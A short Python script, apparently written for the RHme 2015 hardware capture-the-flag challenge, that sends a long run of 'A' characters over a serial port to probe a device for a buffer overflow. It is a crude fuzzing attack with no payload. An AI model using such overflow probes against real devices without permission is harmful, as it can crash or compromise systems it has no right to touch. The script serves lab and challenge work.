#!/usr/bin/env python

from rhme_utilities import *

#---------------------------------------
#   Implementation
#---------------------------------------

# Info and Style
print("")
print("-------------------- RHme 2015 Overflower --------------------")
print("")

# Add additional argument
parser.add_argument('-limit', type=int, help="Specify the number of characters used for input.")
args = parser.parse_args()

# Set Overflow limit
if args.limit:
    limitValue = args.limit
else:
    limitValue = 500

# Define Main
def main():
    # Write a lot of characters
    input = "A"
    for iterator in range(0, limitValue):
        input += "A"
    
    # Send the Attack
    serialPort.write(input + crlf)

    # Show what happens
    Serial_Flush()

    # Be proud
    print("I work!")

# Run Main
if __name__ == '__main__':
    main()